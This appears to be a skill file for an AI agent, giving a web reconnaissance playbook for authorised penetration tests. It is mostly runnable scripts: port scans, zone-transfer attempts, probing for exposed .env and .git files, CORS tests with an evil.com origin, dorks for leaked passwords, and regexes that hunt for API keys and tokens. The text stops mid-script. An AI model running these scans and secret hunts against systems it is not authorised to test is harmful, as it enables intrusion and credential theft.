---
description: Web reconnaissance methodology for authorized offensive security engagements. Covers passive DNS, certificate transparency, OSINT, active port scanning, HTTP fingerprinting, security header analysis, CORS testing, cookie analysis, content discovery, JavaScript analysis (source maps, webpack chunks, React/Angular/Vue extraction, secret hunting), cloud storage enumeration (S3/Azure/GCP), email and employee harvesting, mobile app recon (APK/iOS), third-party integration discovery (Stripe/Firebase/Twilio/Salesforce), and CI/CD exposure (Jenkins/GitHub Actions/.env). Load when starting any web target engagement.
---

# WEB RECON SKILL

## PHASE 0 — WORKSPACE AND TOOL DISCOVERY

```bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TARGET_DOMAIN="${1:-target.com}"
WORKSPACE=~/recon_${TIMESTAMP}_${TARGET_DOMAIN//[^a-zA-Z0-9]/_}

mkdir -p $WORKSPACE/{recon/{dns,subdomains,ports,http,tech,osint,js/{downloaded,sourcemaps,chunks,secrets},cloud,mobile,cicd},vulns/{confirmed,potential,research},exploits/{working,attempted},loot/{credentials,data,flags}}

echo "[*] Workspace: $WORKSPACE"
echo "[*] Target: $TARGET_DOMAIN"
echo "[*] Started: $(date)" > $WORKSPACE/continuous.md
echo "" >> $WORKSPACE/continuous.md

# Discover available tools
for tool in nmap masscan dig host nslookup whois curl wget python3 go \
  subfinder amass assetfinder findomain dnsx httpx nuclei ffuf gobuster \
  wfuzz nikto whatweb katana hakrawler gau waybackurls gospider arjun \
  paramspider jq shodan theHarvester trufflehog s3scanner subzy subjack \
  wafw00f sqlmap; do
  if which $tool >/dev/null 2>&1; then
    echo "[+] $tool: $(which $tool)"
  else
    echo "[-] $tool: missing"
  fi
done | tee $WORKSPACE/tools_available.txt

# Resolve target
TARGET_HOST=$(echo "$TARGET_DOMAIN" | sed 's|https\?://||' | sed 's|/.*||')
echo "$TARGET_HOST" > $WORKSPACE/target_host.txt
dig +short $TARGET_HOST A | tee $WORKSPACE/recon/dns/target_ips.txt
dig +short $TARGET_HOST AAAA >> $WORKSPACE/recon/dns/target_ips.txt
TARGET_IP=$(head -1 $WORKSPACE/recon/dns/target_ips.txt)
echo "Primary IP: $TARGET_IP"
```

## TARGET PROFILE TEMPLATE

```
TARGET:
DATE:
OPERATOR:

=== CORE ASSETS ===
Primary Domain:
IP Addresses:
ASN:
Hosting Provider:
CDN/WAF:

=== SUBDOMAINS ===
Total discovered:
Interesting:

=== OPEN PORTS/SERVICES ===
80/443:
Other:

=== TECHNOLOGIES ===
Web Server:
Backend Framework:
Frontend Framework:
Database (inferred):
CMS:
CDN:
WAF:
Auth Provider:

=== CLOUD ASSETS ===
Provider (AWS/GCP/Azure):
S3 Buckets:
Azure Blobs:
GCP Buckets:
Open/Misconfigured:

=== MOBILE APPS ===
Android Package (com.x.y):
iOS Bundle ID:
APK Download URL:
API Base URL (from mobile):

=== THIRD-PARTY INTEGRATIONS ===
Payment: (Stripe/Braintree/PayPal)
Email: (SendGrid/Mailgun/SES)
SMS: (Twilio/Vonage)
Analytics: (GA/Mixpanel/Segment)
Auth: (Auth0/Okta/Firebase)
CRM: (Salesforce/HubSpot)
CI/CD: (GitHub Actions/Jenkins/GitLab CI)

=== CREDENTIALS FOUND ===

=== HIGH-VALUE ATTACK VECTORS ===
1.
2.
3.
```

## PHASE 1 — PASSIVE DNS RECONNAISSANCE

```bash
TARGET="target.com"
WORKSPACE=~/recon_target

# All DNS record types
for rtype in A AAAA MX NS TXT SOA CNAME SRV CAA DNSKEY TLSA NAPTR; do
  echo "=== $rtype ===" >> $WORKSPACE/recon/dns/all_records.txt
  dig $TARGET $rtype +noall +answer +time=5 2>/dev/null >> $WORKSPACE/recon/dns/all_records.txt
done
cat $WORKSPACE/recon/dns/all_records.txt

# Zone transfer attempt against every NS
for ns in $(dig $TARGET NS +short 2>/dev/null | sed 's/\.$//'); do
  echo "=== Zone transfer: $ns ===" >> $WORKSPACE/recon/dns/zone_transfers.txt
  dig axfr $TARGET @$ns 2>/dev/null >> $WORKSPACE/recon/dns/zone_transfers.txt
  dig axfr $TARGET @$ns 2>/dev/null | grep -v "^;" | grep -v "^$" | awk '{print $1}' | \
    sed 's/\.$//; /^$/d' >> $WORKSPACE/recon/subdomains/zone_transfer_subs.txt
done

# Certificate Transparency — crt.sh
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | tr ',' '\n' | sort -u \
  > $WORKSPACE/recon/subdomains/crtsh.txt
echo "[*] crt.sh: $(wc -l < $WORKSPACE/recon/subdomains/crtsh.txt) subdomains"

# CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=$TARGET&include_subdomains=true&expand=dns_names" 2>/dev/null | \
  jq -r '.[].dns_names[]' | sort -u > $WORKSPACE/recon/subdomains/certspotter.txt

# Subfinder
subfinder -d $TARGET -o $WORKSPACE/recon/subdomains/subfinder.txt \
  -all -silent -timeout 30 2>/dev/null
echo "[*] subfinder: $(wc -l < $WORKSPACE/recon/subdomains/subfinder.txt) subdomains"

# Amass passive
amass enum -passive -d $TARGET -o $WORKSPACE/recon/subdomains/amass_passive.txt \
  -timeout 5 2>/dev/null

# Assetfinder
assetfinder --subs-only $TARGET 2>/dev/null > $WORKSPACE/recon/subdomains/assetfinder.txt

# Findomain
findomain -t $TARGET -q 2>/dev/null > $WORKSPACE/recon/subdomains/findomain.txt

# Consolidate all
cat $WORKSPACE/recon/subdomains/*.txt 2>/dev/null | \
  grep -v "^\*" | grep "\.$TARGET$\|^$TARGET$" | \
  sort -u > $WORKSPACE/recon/subdomains/all_subdomains.txt
echo "[*] Total unique subdomains: $(wc -l < $WORKSPACE/recon/subdomains/all_subdomains.txt)"

# Resolve with dnsx
dnsx -l $WORKSPACE/recon/subdomains/all_subdomains.txt \
  -o $WORKSPACE/recon/subdomains/resolved.txt \
  -a -cname -resp -silent 2>/dev/null
echo "[*] Resolved: $(wc -l < $WORKSPACE/recon/subdomains/resolved.txt)"

# DNS brute-force
WORDLIST=""
for wl in \
  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; do
  [ -f "$wl" ] && WORDLIST="$wl" && break
done

if [ -n "$WORDLIST" ]; then
  gobuster dns -d $TARGET -w $WORDLIST -o $WORKSPACE/recon/subdomains/gobuster_dns.txt \
    -t 50 --timeout 5s 2>/dev/null
fi

# Web archive URLs (passive — zero packets to target)
gau --providers wayback,commoncrawl,otx,urlscan $TARGET \
  > $WORKSPACE/recon/osint/gau_urls.txt 2>/dev/null
waybackurls $TARGET > $WORKSPACE/recon/osint/wayback_urls.txt 2>/dev/null
echo "[*] Archive URLs: $(wc -l < $WORKSPACE/recon/osint/gau_urls.txt)"

# Reverse DNS on discovered IPs
while read ip; do
  host $ip 2>/dev/null >> $WORKSPACE/recon/dns/reverse_dns.txt
done < $WORKSPACE/recon/dns/target_ips.txt
```

## PHASE 2 — OSINT

```bash
TARGET="target.com"

# WHOIS
whois $TARGET > $WORKSPACE/recon/osint/whois_domain.txt 2>/dev/null
while read ip; do
  whois $ip >> $WORKSPACE/recon/osint/whois_ip.txt 2>/dev/null
done < $WORKSPACE/recon/dns/target_ips.txt

# ASN discovery
TARGET_IP=$(head -1 $WORKSPACE/recon/dns/target_ips.txt)
curl -s "https://ipinfo.io/$TARGET_IP/json" 2>/dev/null | jq . > $WORKSPACE/recon/osint/ipinfo.txt
ASN=$(jq -r '.org // ""' $WORKSPACE/recon/osint/ipinfo.txt | grep -oP 'AS\d+')
echo "ASN: $ASN" | tee $WORKSPACE/recon/osint/asn.txt
curl -s "https://api.bgpview.io/asn/${ASN#AS}/prefixes" 2>/dev/null | \
  jq -r '.data.ipv4_prefixes[].prefix' > $WORKSPACE/recon/osint/asn_ranges.txt

# Shodan
shodan search --fields ip_str,port,org,hostnames "hostname:$TARGET" \
  > $WORKSPACE/recon/osint/shodan_results.txt 2>/dev/null

# Google dorks — print for manual execution
sed "s/TARGET/$TARGET/g" > $WORKSPACE/recon/osint/google_dorks.txt << DORKS
site:$TARGET
site:$TARGET filetype:pdf
site:$TARGET filetype:xls OR filetype:xlsx
site:$TARGET filetype:doc OR filetype:docx
site:$TARGET inurl:admin
site:$TARGET inurl:login
site:$TARGET inurl:api
site:$TARGET inurl:backup
site:$TARGET inurl:config
site:$TARGET inurl:upload
site:$TARGET inurl:dashboard
site:$TARGET ext:env
site:$TARGET ext:log
site:$TARGET ext:bak
site:$TARGET ext:sql
site:$TARGET ext:conf
site:$TARGET ext:yml OR ext:yaml
"@$TARGET" filetype:xls
"$TARGET" "password" site:pastebin.com
"$TARGET" "api_key" site:github.com
"$TARGET" site:trello.com
"$TARGET" site:jira.atlassian.com
intitle:"index of" site:$TARGET
DORKS

# GitHub dorking
curl -s "https://api.github.com/search/code?q=$TARGET+password&per_page=10" \
  -H "Accept: application/vnd.github.v3+json" 2>/dev/null | \
  jq -r '.items[]?.html_url' > $WORKSPACE/recon/osint/github_leaks.txt
curl -s "https://api.github.com/search/code?q=$TARGET+api_key&per_page=10" \
  -H "Accept: application/vnd.github.v3+json" 2>/dev/null | \
  jq -r '.items[]?.html_url' >> $WORKSPACE/recon/osint/github_leaks.txt

# Manual search URLs
cat > $WORKSPACE/recon/osint/manual_searches.txt << EOF
https://www.google.com/search?q=site:pastebin.com+"$TARGET"
https://www.google.com/search?q=site:gist.github.com+"$TARGET"
https://github.com/search?q=$TARGET+password&type=code
https://github.com/search?q=$TARGET+secret&type=code
https://github.com/search?q=$TARGET+api_key&type=code
https://dehashed.com/search?query=$TARGET
https://haveibeenpwned.com/
https://intelx.io/?s=$TARGET
https://hunter.io/domain-search/$TARGET
EOF
```

## PHASE 3 — ACTIVE SERVICE DISCOVERY

```bash
TARGET_IP=$(head -1 $WORKSPACE/recon/dns/target_ips.txt)

# Fast TCP all-ports
nmap -sS -p- --min-rate 10000 --open -oA $WORKSPACE/recon/ports/tcp_all $TARGET_IP 2>/dev/null
# Service/version on open ports
OPEN_PORTS=$(grep "open" $WORKSPACE/recon/ports/tcp_all.nmap 2>/dev/null | \
  awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
if [ -n "$OPEN_PORTS" ]; then
  nmap -sV -sC -p "$OPEN_PORTS" -oA $WORKSPACE/recon/ports/services $TARGET_IP 2>/dev/null
fi

# UDP top 100
nmap -sU --top-ports 100 -oA $WORKSPACE/recon/ports/udp_top100 $TARGET_IP 2>/dev/null

# HTTP/S probe all subdomains
httpx -l $WORKSPACE/recon/subdomains/all_subdomains.txt \
  -o $WORKSPACE/recon/http/live_hosts.txt \
  -status-code -title -tech-detect -content-length -follow-redirects \
  -timeout 10 -retries 2 -silent 2>/dev/null
echo "[*] Live HTTP hosts: $(wc -l < $WORKSPACE/recon/http/live_hosts.txt)"

# Alternate ports
httpx -l $WORKSPACE/recon/subdomains/all_subdomains.txt \
  -ports 80,443,8080,8443,8000,8001,8008,8888,3000,3001,4000,4001,5000,5001,9000,9090,9443,10000 \
  -o $WORKSPACE/recon/http/live_hosts_altports.txt \
  -status-code -title -silent 2>/dev/null
```

## PHASE 4 — HTTP FINGERPRINTING

```bash
TARGET_URL="https://target.com"

# Full header grab
curl -sI $TARGET_URL > $WORKSPACE/recon/http/headers.txt
curl -sI http://target.com >> $WORKSPACE/recon/http/headers.txt

# HTTP/2 and HTTP/3 detection
curl -sI --http2 $TARGET_URL 2>/dev/null | grep -i "HTTP/2" && \
  echo "[+] HTTP/2 supported" | tee $WORKSPACE/recon/http/http_versions.txt
curl -sI --http3 $TARGET_URL 2>/dev/null | grep -i "HTTP/3" && \
  echo "[+] HTTP/3 supported" | tee -a $WORKSPACE/recon/http/http_versions.txt
nmap -p 443 --script http-http2-push $TARGET_URL 2>/dev/null | \
  tee -a $WORKSPACE/recon/http/http_versions.txt

# Security header analysis
echo "=== SECURITY HEADER AUDIT ===" > $WORKSPACE/recon/http/security_headers.txt
for header in \
  "Strict-Transport-Security" \
  "Content-Security-Policy" \
  "X-Frame-Options" \
  "X-Content-Type-Options" \
  "Referrer-Policy" \
  "Permissions-Policy" \
  "X-XSS-Protection" \
  "Cross-Origin-Embedder-Policy" \
  "Cross-Origin-Opener-Policy" \
  "Cross-Origin-Resource-Policy"; do
  VAL=$(curl -sI $TARGET_URL 2>/dev/null | grep -i "^$header:" | head -1 | tr -d '\r')
  if [ -n "$VAL" ]; then
    echo "[+] PRESENT: $VAL" >> $WORKSPACE/recon/http/security_headers.txt
  else
    echo "[-] MISSING: $header" >> $WORKSPACE/recon/http/security_headers.txt
  fi
done
cat $WORKSPACE/recon/http/security_headers.txt

# CSP analysis
CSP=$(curl -sI $TARGET_URL 2>/dev/null | grep -i "content-security-policy:" | head -1)
{
  echo "CSP: $CSP"
  echo "$CSP" | grep -qi "unsafe-inline" && echo "[!] unsafe-inline present — XSS via inline scripts possible"
  echo "$CSP" | grep -qi "unsafe-eval" && echo "[!] unsafe-eval present — XSS escalation possible"
  echo "$CSP" | grep -qP "\*\." && echo "[!] Wildcard subdomain source — controlled subdomain = XSS"
  echo "$CSP" | grep -qi "data:" && echo "[!] data: URI allowed — XSS possible"
  echo "$CSP" | grep -qi "script-src \*\|default-src \*" && echo "[CRITICAL] Wildcard script-src!"
  echo "$CSP" | grep -qv "script-src\|default-src" && echo "[!] No script-src directive"
} | tee $WORKSPACE/recon/http/csp_analysis.txt

# CORS misconfiguration testing
{
  echo "=== CORS TESTS ==="
  for origin in \
    "https://evil.com" \
    "null" \
    "https://$TARGET.evil.com" \
    "https://evil.$TARGET" \
    "https://${TARGET}.evil.com" \
    "https://evil.com%60$TARGET"; do
    CORS_RESP=$(curl -sI -H "Origin: $origin" $TARGET_URL 2>/dev/null | grep -i "access-control")
    [ -n "$CORS_RESP" ] && echo "Origin: $origin -> $CORS_RESP"
  done

  # Test API endpoints for CORS
  for ep in /api /api/v1 /api/v2 /graphql /rest; do
    RESP=$(curl -sI -H "Origin: https://evil.com" "${TARGET_URL}${ep}" 2>/dev/null | grep -i "access-control")
    [ -n "$RESP" ] && echo "$ep: $RESP"
  done

  # Check CORS with credentials (critical)
  FULL=$(curl -sI \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=test" \
    $TARGET_URL 2>/dev/null)
  ACAO=$(echo "$FULL" | grep -i "access-control-allow-origin" | head -1)
  ACAC=$(echo "$FULL" | grep -i "access-control-allow-credentials" | head -1)
  if echo "$ACAO" | grep -q "evil.com" && echo "$ACAC" | grep -qi "true"; then
    echo "[CRITICAL] CORS: evil.com reflected + credentials=true — full CORS exploit!"
  fi
} | tee $WORKSPACE/recon/http/cors_analysis.txt

# Cookie analysis
{
  echo "=== COOKIE ANALYSIS ==="
  curl -sI $TARGET_URL 2>/dev/null | grep -i "set-cookie:" | while IFS= read -r line; do
    echo "Cookie: $line"
    echo "$line" | grep -qi "httponly" || echo "  [!] MISSING HttpOnly"
    echo "$line" | grep -qi "; secure" || echo "  [!] MISSING Secure flag"
    echo "$line" | grep -qi "samesite" || echo "  [!] MISSING SameSite"
    echo "$line" | grep -qi "samesite=none" && echo "  [!] SameSite=None — CSRF risk if credentials sent"
    # Check for session token pattern
    TOKEN=$(echo "$line" | grep -oP "=[A-Za-z0-9+/=._-]{20,}" | head -1 | tr -d '=')
    [ -n "$TOKEN" ] && echo "  Token sample: ${TOKEN:0:40}... (length: ${#TOKEN})"
    echo "$TOKEN" | grep -qP "^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$" && \
      echo "  [JWT] Token appears to be a JWT"
  done
} | tee $WORKSPACE/recon/http/cookie_analysis.txt

# Technology fingerprinting
whatweb $TARGET_URL -a 3 --no-errors 2>/dev/null > $WORKSPACE/recon/tech/whatweb.txt

# Favicon hash fingerprinting
curl -s "${TARGET_URL}/favicon.ico" -o $WORKSPACE/recon/tech/favicon.ico 2>/dev/null
python3 -c "
try:
    import mmh3, base64
    data = open('$WORKSPACE/recon/tech/favicon.ico','rb').read()
    b64 = base64.encodebytes(data)
    h = mmh3.hash(b64)
    print(f'MurmurHash3 (Shodan): {h}')
    print(f'Shodan search: http.favicon.hash:{h}')
except ImportError:
    import hashlib
    data = open('$WORKSPACE/recon/tech/favicon.ico','rb').read()
    print(f'MD5: {hashlib.md5(data).hexdigest()}')
except: pass
" 2>/dev/null | tee $WORKSPACE/recon/tech/favicon_hash.txt

# Default/interesting path probing
{
  for path in \
    /robots.txt /sitemap.xml /crossdomain.xml /clientaccesspolicy.xml \
    /.well-known/security.txt /.well-known/openid-configuration \
    /.well-known/assetlinks.json /.well-known/apple-app-site-association \
    /manifest.json /humans.txt /security.txt \
    /phpinfo.php /info.php /test.php /php.php \
    /.env /.env.local /.env.production /.env.dev /.env.staging \
    /.git/HEAD /.git/config /.svn/entries /.DS_Store \
    /wp-admin/ /wp-login.php /wp-config.php /wp-json/ \
    /admin/ /admin/login /administrator/ /login /dashboard \
    /console /manager /phpmyadmin/ /adminer.php /backup/ \
    /api/ /api/v1 /api/v2 /graphql /swagger.json /swagger-ui.html \
    /openapi.json /api-docs /redoc \
    /actuator /actuator/health /actuator/env /actuator/mappings \
    /health /healthz /metrics /status /ping \
    /package.json /package-lock.json /composer.json \
    /.travis.yml /.gitlab-ci.yml /Jenkinsfile /Dockerfile \
    /docker-compose.yml /.github/workflows/ \
    /config.php /config.js /config.json /config.yaml \
    /settings.py /application.properties /application.yml \
    /appsettings.json /web.config; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -m 5 "${TARGET_URL}${path}" 2>/dev/null)
    [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && \
      echo "$STATUS ${TARGET_URL}${path}"
  done
} | tee $WORKSPACE/recon/http/interesting_paths.txt

# Nuclei recon scan
nuclei -u $TARGET_URL \
  -t http/exposures/ \
  -t http/technologies/ \
  -t http/misconfiguration/ \
  -t http/default-logins/ \
  -t http/takeovers/ \
  -t ssl/ \
  -t dns/ \
  -severity info,low,medium,high,critical \
  -o $WORKSPACE/vulns/potential/nuclei_recon.txt \
  -silent -stats 2>/dev/null

# Nuclei CVEs
nuclei -u $TARGET_URL \
  -t http/cves/ \
  -t http/exposed-panels/ \
  -severity medium,high,critical \
  -o $WORKSPACE/vulns/potential/nuclei_cves.txt \
  -silent 2>/dev/null
```

## PHASE 5 — CONTENT DISCOVERY

```bash
TARGET_URL="https://target.com"

# Locate a wordlist
for wl in \
  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  /usr/share/seclists/Discovery/Web-Content/common.txt \
  /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; do
  [ -f "$wl" ] && WORDLIST="$wl" && break
done
echo "Using wordlist: $WORDLIST"

# ffuf — directories
ffuf -u "${TARGET_URL}/FUZZ" \
  -w "$WORDLIST" \
  -mc 200,204,301,302,307,401,403,405,500 \
  -o $WORKSPACE/recon/http/ffuf_dirs.json -of json \
  -t 40 -c -r -timeout 10 2>/dev/null

# ffuf — files with extensions
ffuf -u "${TARGET_URL}/FUZZ" \
  -w "$WORDLIST" \
  -e .php,.asp,.aspx,.jsp,.html,.txt,.js,.json,.xml,.bak,.old,.backup,.zip,.tar.gz,.sql,.conf,.cfg,.ini,.log,.env,.py,.rb \
  -mc 200,204,301,302,307 \
  -o $WORKSPACE/recon/http/ffuf_files.json -of json \
  -t 40 -c -timeout 10 2>/dev/null

# API endpoints
API_WORDLIST="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
[ -f "$API_WORDLIST" ] && \
  ffuf -u "${TARGET_URL}/FUZZ" -w "$API_WORDLIST" \
    -mc 200,201,204,301,302,307,401,403 \
    -o $WORKSPACE/recon/http/ffuf_api.json -of json \
    -t 40 -timeout 10 2>/dev/null

# Admin panels
ADMIN_WORDLIST="/usr/share/seclists/Discovery/Web-Content/AdminPanels.txt"
[ -f "$ADMIN_WORDLIST" ] && \
  ffuf -u "${TARGET_URL}/FUZZ" -w "$ADMIN_WORDLIST" \
    -mc 200,301,302,401,403 \
    -o $WORKSPACE/recon/http/ffuf_admin.json -of json -t 30 2>/dev/null

# Parameter discovery
arjun -u "$TARGET_URL" -m GET -t 10 -o $WORKSPACE/recon/http/arjun_get.json 2>/dev/null
arjun -u "$TARGET_URL" -m POST -t 10 -o $WORKSPACE/recon/http/arjun_post.json 2>/dev/null

# Parse ffuf results
python3 -c "
import json, glob, os
for f in glob.glob('$WORKSPACE/recon/http/ffuf_*.json'):
    try:
        d = json.load(open(f))
        for r in d.get('results', []):
            print(f\"{r['status']} {r['length']}b {r['url']}\")
    except: pass
" | sort -t' ' -k1,1 | tee $WORKSPACE/recon/http/all_discovered_paths.txt
```

## PHASE 6 — SPIDERING AND CRAWLING

```bash
TARGET_URL="https://target.com"

# Katana
katana -u "$TARGET_URL" \
  -d 5 -jc -kf all \
  -o $WORKSPACE/recon/http/katana.txt \
  -silent 2>/dev/null
echo "[*] Katana: $(wc -l < $WORKSPACE/recon/http/katana.txt) URLs"

# Hakrawler
echo "$TARGET_URL" | hakrawler -d 3 -t 20 2>/dev/null \
  > $WORKSPACE/recon/http/hakrawler.txt

# GAU
gau --providers wayback,commoncrawl,otx,urlscan "$TARGET_URL" \
  > $WORKSPACE/recon/http/gau_all.txt 2>/dev/null

# Wayback URLs with parameters
waybackurls "$TARGET_URL" 2>/dev/null | grep "?" \
  > $WORKSPACE/recon/http/wayback_params.txt

# Extract JS files from all sources
cat $WORKSPACE/recon/http/katana.txt \
    $WORKSPACE/recon/http/hakrawler.txt \
    $WORKSPACE/recon/http/gau_all.txt \
    $WORKSPACE/recon/osint/gau_urls.txt 2>/dev/null | \
  grep -E "\.js(\?|$)" | sort -u > $WORKSPACE/recon/js/js_files.txt
echo "[*] JS files: $(wc -l < $WORKSPACE/recon/js/js_files.txt)"

# Extract unique parameters
cat $WORKSPACE/recon/http/katana.txt \
    $WORKSPACE/recon/http/wayback_params.txt \
    $WORKSPACE/recon/http/gau_all.txt 2>/dev/null | \
  grep "?" | sed 's/=.*/=/g' | sort -u \
  > $WORKSPACE/recon/http/unique_params.txt
echo "[*] Unique parameter names: $(wc -l < $WORKSPACE/recon/http/unique_params.txt)"
```

## PHASE 7 — JAVASCRIPT ANALYSIS

```bash
JS_DIR=$WORKSPACE/recon/js
TARGET_URL="https://target.com"

# Download all JS files
while IFS= read -r js_url; do
  [ -z "$js_url" ] && continue
  fname=$(echo "$js_url" | md5sum | cut -d' ' -f1).js
  curl -s --max-time 15 "$js_url" -o "$JS_DIR/downloaded/$fname" 2>/dev/null
  echo "$js_url -> $fname" >> $JS_DIR/js_url_map.txt
done < $JS_DIR/js_files.txt
echo "[*] Downloaded $(ls $JS_DIR/downloaded/*.js 2>/dev/null | wc -l) JS files"

# Source map extraction (*.js.map) — exposes original source code
while IFS= read -r js_url; do
  [ -z "$js_url" ] && continue
  map_url="${js_url}.map"
  STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 10 "$map_url" 2>/dev/null)
  if [ "$STATUS" = "200" ]; then
    fname=$(echo "$map_url" | md5sum | cut -d' ' -f1).map
    curl -s "$map_url" -o "$JS_DIR/sourcemaps/$fname" 2>/dev/null
    echo "[+] SOURCE MAP FOUND: $map_url" | tee -a $JS_DIR/sourcemaps_found.txt
    # Extract original source paths from map
    python3 -c "
import json, sys
try:
    d = json.load(open('$JS_DIR/sourcemaps/$fname'))
    for s in d.get('sources', []):
        print(s)
except: pass
" >> $JS_DIR/sourcemaps_sources.txt
  fi
done < $JS_DIR/js_files.txt

# Also check for common source map paths
for mappath in \
  "/static/js/main.chunk.js.map" \
  "/static/js/bundle.js.map" \
  "/assets/application.js.map" \
  "/dist/bundle.js.map" \
  "/js/app.js.map"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}${mappath}" 2>/dev/null)
  [ "$STATUS" = "200" ] && echo "[+] Source map: ${TARGET_URL}${mappath}" | tee -a $JS_DIR/sourcemaps_found.txt
done

# Webpack chunk analysis
grep -r "__webpack_require__\|webpackChunkName\|webpackChunks\|webpack_exports" \
  $JS_DIR/downloaded/ 2>/dev/null > $JS_DIR/chunks/webpack_present.txt
if [ -s $JS_DIR/chunks/webpack_present.txt ]; then
  echo "[+] Webpack detected"
  # Extract chunk URLs/filenames
  grep -rhoP '"[a-zA-Z0-9_./]+\.js"' $JS_DIR/downloaded/ 2>/dev/null | \
    tr -d '"' | grep -v "node_modules\|test\|spec" | sort -u \
    > $JS_DIR/chunks/chunk_filenames.txt
  # Try to fetch chunks
  while read chunk; do
    for base in "/static/js/" "/js/" "/assets/" "/dist/" "/"; do
      URL="${TARGET_URL}${base}${chunk}"
      S=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "$URL" 2>/dev/null)
      [ "$S" = "200" ] && {
        curl -s "$URL" -o "$JS_DIR/chunks/$(basename $chunk)" 2>/dev/null
        echo "[+] Chunk: $URL" | tee -a $JS_DIR/chunks/downloaded.txt
      }
    done
  done < $JS_DIR/chunks/chunk_filenames.txt
fi

# Check for exposed webpack stats
for statsfile in /webpack-stats.json /bundle-stats.json /stats.json /build-manifest.json; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}${statsfile}" 2>/dev/null)
  [ "$STATUS" = "200" ] && {
    curl -s "${TARGET_URL}${statsfile}" | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    mods = d.get('modules', d.get('assets', []))
    print(f'[+] Webpack stats exposed: ${TARGET_URL}${statsfile}')
    for m in mods[:30]:
        name = m.get('name','') or m.get('chunks','')
        print(f'  {name}')
except: print('[+] Stats file exposed but unparseable')
" 2>/dev/null | tee -a $JS_DIR/webpack_stats.txt
  }
done

# React component/route extraction
{
  grep -rh "path.*['\"]/" $JS_DIR/downloaded/ 2>/dev/null | \
    grep -oP "'[/a-z0-9:_-]+'|\"[/a-z0-9:_-]+\"" | tr -d "'\"" | \
    grep "^/" | sort -u
  grep -rhoP '"[/][a-z0-9_/-]+"' $JS_DIR/downloaded/ 2>/dev/null | \
    tr -d '"' | grep -v "^//\|node_modules" | sort -u
} | sort -u > $JS_DIR/react_routes.txt

# Angular route extraction
grep -rh "path:\|loadChildren:\|RouterModule" $JS_DIR/downloaded/ 2>/dev/null | \
  grep -oP "'[a-z0-9/_-]+'|\"[a-z0-9/_-]+\"" | tr -d "'\"" | sort -u \
  > $JS_DIR/angular_routes.txt

# Vue component extraction
grep -rh "component:\|defineComponent\|Vue.component" $JS_DIR/downloaded/ 2>/dev/null | \
  grep -oP "'[A-Za-z][A-Za-z0-9_-]+'|\"[A-Za-z][A-Za-z0-9_-]+\"" | tr -d "'\"" | sort -u \
  > $JS_DIR/vue_components.txt

# API endpoint extraction from JS
{
  grep -rhoP "fetch\s*\(['\"\`]/[a-z0-9/_.-]+['\"\`]" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "axios\.(get|post|put|delete|patch)\s*\(['\"\`]/[a-z0-9/_.-]+" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "url:\s*['\"\`]/[a-zA-Z0-9/_.-]+" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "['\"\`]/api/[a-zA-Z0-9/_.-]+" $JS_DIR/downloaded/ 2>/dev/null
} | grep -oP "/[a-zA-Z0-9/_.-]+" | sort -u | grep -v "^//" \
  > $JS_DIR/api_endpoints_from_js.txt
echo "[*] API endpoints from JS: $(wc -l < $JS_DIR/api_endpoints_from_js.txt)"

# Secret hunting
{
  echo "=== AWS ===" 
  grep -rhoP "AKIA[0-9A-Z]{16}" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "(?i)aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*['\"]?[A-Za-z0-9/+]{40}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== STRIPE ==="
  grep -rhoP "(?:pk|sk)_(test|live)_[A-Za-z0-9]{20,}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== FIREBASE ==="
  grep -rhoP "AIza[0-9A-Za-z_-]{35}" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "https://[a-z0-9-]+\.firebaseio\.com" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "https://[a-z0-9-]+\.firebasestorage\.googleapis\.com" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== TWILIO ==="
  grep -rhoP "AC[a-z0-9]{32}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== SENDGRID ==="
  grep -rhoP "SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== GOOGLE API ==="
  grep -rhoP "AIza[0-9A-Za-z_-]{35}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== JWT TOKENS ==="
  grep -rhoP "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== GENERIC API KEY ==="
  grep -rhoP "(?i)api[_-]?key\s*[=:]\s*['\"]?[A-Za-z0-9_-]{20,}" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "(?i)access[_-]?token\s*[=:]\s*['\"]?[A-Za-z0-9_.-]{20,}" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "(?i)secret\s*[=:]\s*['\"]?[A-Za-z0-9_.-]{20,}" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== INTERNAL URLs ==="
